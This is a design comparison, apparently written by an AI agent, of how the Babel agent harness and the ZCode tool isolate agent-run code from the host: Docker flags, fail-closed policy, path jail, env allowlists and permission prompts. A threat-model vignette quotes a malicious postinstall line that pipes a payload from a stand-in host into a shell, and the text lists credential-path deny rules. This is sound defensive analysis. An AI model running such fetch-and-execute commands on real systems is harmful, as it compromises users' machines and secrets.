@@ -1,0 +1,86 @@
+# 03 — Isolation, Sandboxing & Fail-Closed Boundaries
+
+**Thesis:** Babel treats "the agent's code must not reach the host" as enforceable policy — a Docker boundary that fails closed with named escalation env vars, plus layered host-side mitigations — while ZCode delegates the same problem to an OS-level sandbox flag plus a human permission prompt, making trust proportional to operator attention and leaving no answer at all for unattended runs.
+
+## Scope
+
+This section covers what agent-executed code can actually do to the host machine: kernel/container isolation, filesystem jail, network denial, child-process environment hygiene, command gating, and — the differentiator — what happens *when isolation is unavailable*. We compare Babel's implementation (read from `/home/linuxuser/Babel`, strictly read-only) against ZCode's model as directly observed from inside a live ZCode session. Out of scope: completion verification, evidence/replay, and model routing (other sections). ZCode claims are limited to what this session can observe: the Bash tool's sandbox flag and its per-call override, permission gating, and hook interception points. Where ZCode has no observable mechanism, we say so rather than infer one.
+
+## How Babel does it
+
+Babel's own normative doc rates this subsystem **PARTIAL — "strong when Docker active"** (`docs/architecture/HARNESS_ARCHITECTURE_V1.md` §6.3 subsystem 5, §6.9). That honesty frames everything below.
+
+**Kernel boundary — Docker backend.** When the execution profile declares `dockerSandbox: true` and the daemon plus configured image are available, every shell command is wrapped by `buildBenchmarkContainerCommand` (`babel-cli/src/config/benchmarkContainer.ts`): `docker run --rm --network none --cap-drop=ALL --security-opt=no-new-privileges -v <project>:/app`, plus a read-only empty git-hooks bind mount and git env hardening (`GIT_TERMINAL_PROMPT=0`, empty `core.hooksPath`, no gpg signing — `babel-cli/src/authority/unprivilegedChildEnv.ts`). `--network none` blocks exfiltration from inside the container; cap-drop and `no-new-privileges` block privilege escalation. Operator-supplied extra args (`BABEL_BENCHMARK_DOCKER_EXTRA_ARGS`) pass through a validator (`babel-cli/src/config/dockerIsolationArgs.ts`) that rejects `--privileged`, `--cap-add`, `--device`, `--pid=host`, `--userns=host`, and any `--network` other than `none` — and an unsafe extras string is itself a fail-closed condition, not a warning.
+
+**Fail-closed governed isolation (invariant H13).** `evaluateGovernedIsolation()` (`benchmarkContainer.ts`) returns one of four decisions: `docker`, `host_profile` (profile opted out, e.g. `dev_local`), `host_escalated` (operator set `BABEL_ALLOW_HOST_FALLBACK=1` or `BABEL_DOCKER_DISABLE=true`), or `fail_closed`. `SafeExecutor.prepareShellExecution` (`babel-cli/src/sandbox.ts`, ~lines 1712–1765) turns `fail_closed` into a structured `isolation_unavailable` denial — the work stops; it does not silently degrade to host. Even on host-resolved decisions, commands classified `project_code` or `container_only` by the risk registry (`babel-cli/src/authority/commandSpec.ts`) are denied with `isolation_required` unless the escalation env var is set — and then the harness emits a visible `[sandbox] host fallback authorized ...` notice at the point of execution, keeping the weakened boundary auditable. ADR-008 (`docs/adr/ADR-008-docker-isolation-strategy.md`) records this as H4 and pins the compliance rule: "An unavailable isolation boundary fails closed; a direct host run requires explicit operator escalation and remains auditable."
+
+**Profiles.** `babel-cli/src/config/executionProfiles.ts` defines eight profiles. The default `safe_repo` is Docker-preferred; `dev_local` and `bench_local` are the explicit host-oriented opt-outs (`dockerSandbox: false`); high-assurance profiles (`benchmark_container`, `opencalw_manager`, `babel_research`) additionally default the clean-room IndependentVerifier on. Profiles also carry tool allow/deny lists (e.g. `read_only_audit` denies `file_write`/`shell_exec`; `bench_local` denies `shell_exec`, network tools) and per-tool timeouts/iteration budgets.
+
+**Host-side defense in depth (what remains without Docker).**
+- *Command allowlist + interpreter eval-flag block* (`sandbox.ts`): only allowlisted bases run; shell metacharacters are rejected via an operator regex with NFKC homoglyph normalization and a context-aware tokenizer, re-checked immediately before spawn. `node -e/-p`, `python -c`, `deno eval` are blocked (H1 in ADR-008) unless `BABEL_ALLOW_INTERPRETER_EVAL=1`. The code comment is candid about the gap: this "does not prevent code execution through script files written by the LLM... An OS-level sandbox... is the only complete mitigation." `HARNESS_OVERVIEW.md` labels the interpreter allowlist **"Partial — blocks inline `-e`/`-c` by default; script files still run."**
+- *Path jail* (ADR-007, `docs/adr/ADR-007-path-jail-symlink.md`): `resolveSafe()`/`resolveSafeRead()` walk each path segment with `realpathSync`, rejecting symlink escapes at any depth; writes are locked to the project root (with `O_NOFOLLOW` on final opens and symlink-swap checks during parent creation), reads may extend to approved roots, credential-class paths (`.env`, `id_rsa`, `.ssh`, `.aws/credentials`, `*.pem/.p12/.pfx`) are read-denied outright (`isCredentialReadPath`), and cwd is realpath-re-checked before spawn to close a TOCTOU window.
+- *Env allowlist* (`babel-cli/src/utils/safeEnv.ts`): `getSafeEnv()` passes only 9 generic vars (PATH, HOME, TMP, ...) plus ~48 explicitly allowlisted `BABEL_*` config vars; **unknown `BABEL_*` vars are stripped**, so a future secret-bearing var fails closed too. The unprivileged variant (`unprivilegedChildEnv.ts`) additionally points `GH_CONFIG_DIR` at an empty temp dir and empties git config, so `run_local_command` children cannot reach `gh` credentials.
+
+**The admitted cost.** §6.9 and §6.3 name the gap: "Day-to-day host work on `safe_repo` requires Docker image or explicit escalation env." ADR-008's trade-offs list "Docker dependency adds setup complexity" and per-command container overhead. Note the escape hatches are constrained by design: `dev_local` denies project-code execution anyway (its own prompt lines say `npm/cargo/go/... tests and builds are denied without Docker isolation`), so the real choices are *install Docker*, *escalate auditable host fallback*, or *don't run the code*.
+
+## How ZCode does it
+
+Described strictly from the environment this report is written in:
+
+- **OS-level sandbox flag on Bash.** Bash calls can run sandboxed; the tool surface exposes an explicit per-call override ("dangerously disable sandbox / run without sandboxing"). This is a real OS-level boundary when on, and the override is honest about its cost — but it is per-call discretion, not a declared policy. There is no profile concept saying *this task class requires the sandbox*; nothing fails closed when the sandbox is off. There is no container story: no Docker-equivalent default, no `--network none` analog, no cap-drop. (In this session the process cgroup shows `/init.scope` — plain host, no container.)
+- **Permission gating.** Tool calls pass through a user-selected permission mode; a denied call is a signal to adjust approach, not retry. This is fail-to-human rather than fail-closed: the boundary is the operator's attention, applied per action, interactively. For decisions that are genuinely the operator's, the harness offers a structured question channel rather than guessing.
+- **Hooks.** Operator-configurable hook interception points exist, so a motivated operator can layer policy outside the model (e.g. block patterns on Bash). This is policy-building capacity, not shipped isolation.
+- **What I cannot point to.** No env-stripping allowlist: child shells inherit the session environment (32 vars in this session, none credential-named — but that is this operator's hygiene, not harness enforcement). No isolation profiles, no governed-isolation evaluator, no structured "isolation unavailable" state. Supply-chain actions — `npm install` (postinstall scripts), `curl | sh` — execute at user privilege with session env whenever the operator approves them (or disables the sandbox), and the only thing standing between an untrusted repo's test suite and the host is the mode the human selected.
+
+The fit matters: ZCode's model is coherent for **single-operator interactive use**, where every action is either sandboxed or surfacing to a human who just asked for it. It degrades linearly with attention: prompt fatigue → "always allow" → sandbox disabled → the agent effectively holds the operator's full authority. For unattended governed runs, there is no mechanism here that bounds the blast radius at all.
+
+## Head-to-head
+
+| Dimension | Babel | ZCode (observed) |
+|---|---|---|
+| Kernel-level boundary | Docker: `--network none`, `--cap-drop=ALL`, `no-new-privileges`, project-only mount (**IMPLEMENTED** when active) | OS-level sandbox flag on Bash; no container story |
+| Behavior when isolation unavailable | H13 `fail_closed` structured denial; explicit escalation env (`BABEL_ALLOW_HOST_FALLBACK=1`, `BABEL_DOCKER_DISABLE=true`) with audible notice | Nothing fires; sandbox is simply on/off per call. Fail-to-human via permission prompt |
+| Filesystem jail | Path jail w/ segment-wise symlink resolution, `O_NOFOLLOW`, TOCTOU recheck, credential-read denial (ADR-007) | Workspace-convention + sandbox (when on); no observable path-jail equivalent for tool file ops |
+| Network denial | Hard (`--network none`) in container; allowlist-mediated on host | Sandbox-dependent (when on); otherwise operator judgment per approval |
+| Child env hygiene | Allowlist-only `getSafeEnv()`; unknown `BABEL_*` stripped; unprivileged gh/git variant | None observable; children inherit session env |
+| Command policy | Allowlist + risk-class registry + eval-flag block + double operator-regex check; **gap: script files still run** (self-declared **PARTIAL**) | Permission gate per command; human is the classifier |
+| Untrusted-code posture | Designed for it: untrusted repo work is a profile + isolation question with a typed denial vocabulary | Human attention is the control; unattended = unbounded |
+| Maturity honesty | Normative **PARTIAL** labels, named gaps, ADR trade-offs | No formal maturity labels to audit |
+
+Prose: the decisive difference is not the Docker flags — it is that Babel wrote down the *invariant* ("governed execution requiring isolation MUST eventually fail closed or require explicit boundary escalation", H13) and made the escalation legible (named env vars, per-run console notice, structured denial categories like `isolation_required` vs `isolation_unavailable`). ZCode's sandbox flag is a comparable *mechanism* with a weaker *contract*: nothing in the harness distinguishes "isolation is required for this and absent" from "isolation was never asked for." Conversely, Babel's stack is heavier and its honesty cuts both ways: outside Docker it is a pile of mitigations whose own docs admit the resident gap (LLM-written script files execute on host), and the default profile is the one most likely to block an operator who hasn't installed Docker.
+
+## Simulation vignette
+
+Task: *"Clone and run this untrusted repo's test suite"* (`npm test`; the repo's postinstall script contains `curl https://evil.example/payload | sh`).
+
+**Babel, `safe_repo` (default), Docker up:** `npm test` classifies as `project_code`; `evaluateGovernedIsolation` returns `docker` (preflight `docker info` passed, `BABEL_BENCHMARK_DOCKER_IMAGE` set); `buildBenchmarkContainerCommand` wraps it. The postinstall's `curl | sh` runs inside the container: `--network none` makes the payload fetch fail; `--cap-drop=ALL`/`no-new-privileges` neutralize local privesc; `getSafeEnv()` means no API keys were passed in anyway; the mount exposes only `/app`. Damage: none.
+
+**Babel, Docker daemon down:** the same command hits `evaluateGovernedIsolation` → `fail_closed` (reason: daemon unavailable or no image configured) → `prepareShellExecution` returns the structured `isolation_unavailable` denial. The run stops — `BLOCKED_POLICY`-shaped, not silently on host. Operator's honest options: start Docker; set `BABEL_ALLOW_HOST_FALLBACK=1` (each project-code command then runs on host with an audible `[sandbox] host fallback authorized` warning — allowlist + `getSafeEnv()` still apply, but the kernel boundary is gone and the malicious postinstall *would* execute); or switch to `dev_local`, where `isolation_required` denies `npm test` regardless. Nothing about this path is silent.
+
+**ZCode, interactive operator, sandbox on:** `npm test` triggers a permission prompt (or auto-runs under the sandbox). If the sandbox mediates it, the malicious postinstall hits the OS-level fence — likely blocked or constrained depending on the sandbox's file/network policy, which is exactly the part with no declared contract. If the operator, on their fifth prompt of the session, disables the sandbox or approves broadly: the postinstall runs with user privileges and the session's full environment. The harness emits no isolation-unavailable signal because it has no concept that one was expected.
+
+**ZCode, unattended:** the permission prompt has no addressee. Whatever mode was last selected is the whole security model. This is the case Babel's H13 exists for and the case where ZCode, as observed, has no answer.
+
+## Verdict
+
+**Babel is better here, where it matters most** — untrusted code and unattended runs — because isolation is *policy*, not *discretion*: a kernel boundary with deny-by-default network, an env allowlist that fails closed on unknown secrets, a risk-class registry that demands isolation for project code, and above all a named fail-closed state with auditable escalation. Its candor (PARTIAL labels, the script-file gap, ADR trade-offs) makes its claims auditable. Its weakness is the operator-UX cliff its own docs admit: no Docker (or no image env var) means blocked work on the default profile, and its non-Docker story is regex-plus-allowlists against an adversary that just writes a script file.
+
+**ZCode is better for friction:** a permission gate that fails to a human per action, a per-call sandbox override that doesn't require daemon infrastructure, and hooks that let operators build policy. For the trusted-repo, operator-watching use case, that is a reasonable trade.
+
+**What each should adopt.** ZCode: (1) declared execution profiles with a fail-closed rule — "untrusted-code task + no sandbox = structured denial", not a prompt; (2) a child-env allowlist (Babel's `getSafeEnv` is ~90 lines and closes the secrets-in-env class outright); (3) Babel's typed-denial vocabulary (`isolation_required` vs `isolation_unavailable`) so the model and the operator can both see *why* something was blocked. Babel: (1) ZCode-style per-action interactive approval as a first-class channel (its approval queue exists only for dependency installs — generalize it to soften the Docker-or-nothing cliff); (2) prioritize H6 platform-native sandboxes (bubblewrap/Seatbelt) so the fail-closed cliff has a middle rung; (3) treat the script-file gap as what it already admits it is — unsolvable above the OS layer — and stop spending regex on it.
+
+## Key sources
+
+- `/home/linuxuser/Babel/docs/architecture/HARNESS_ARCHITECTURE_V1.md` — normative spec; §6.3 subsystem 5 (isolation, PARTIAL), §6.6 invariant H13, §6.9 isolation architecture
+- `/home/linuxuser/Babel/docs/architecture/HARNESS_OVERVIEW.md` — isolation summary table ("strong when active"; interpreter allowlist "Partial")
+- `/home/linuxuser/Babel/docs/adr/ADR-007-path-jail-symlink.md` — segment-wise symlink resolution decision
+- `/home/linuxuser/Babel/docs/adr/ADR-008-docker-isolation-strategy.md` — H1–H4 phases, fail-closed compliance rule, trade-offs
+- `/home/linuxuser/Babel/docs/architecture/HARNESS_HARDENING_ROADMAP_V1.md` — H4 status: "Isolation unavailable never silently becomes host execution"
+- `/home/linuxuser/Babel/babel-cli/src/sandbox.ts` — `SafeExecutor`, allowlist, eval-flag block, `prepareShellExecution` H13 wiring, path jail, credential-read denial
+- `/home/linuxuser/Babel/babel-cli/src/config/benchmarkContainer.ts` — `evaluateGovernedIsolation`, `buildDockerRunCommonArgs`, Docker preflight, escalation env
+- `/home/linuxuser/Babel/babel-cli/src/config/dockerIsolationArgs.ts` — extra-args validator (rejects `--privileged`, `--cap-add`, non-`none` networks)
+- `/home/linuxuser/Babel/babel-cli/src/config/executionProfiles.ts` — 8 profiles, `dockerSandbox`, high-assurance verifier defaults
+- `/home/linuxuser/Babel/babel-cli/src/utils/safeEnv.ts` — `getSafeEnv()` env allowlist
+- `/home/linuxuser/Babel/babel-cli/src/authority/unprivilegedChildEnv.ts` — unprivileged child env, git host hardening
+- `/home/linuxuser/Babel/babel-cli/src/authority/commandSpec.ts` — `ExecutionRisk` registry, `requiresDockerIsolation`
+- ZCode side: direct observation of the live session (Bash sandbox flag + per-call override, permission gating and denial semantics, hooks, inherited session env, absence of container isolation / isolation profiles / env allowlist)
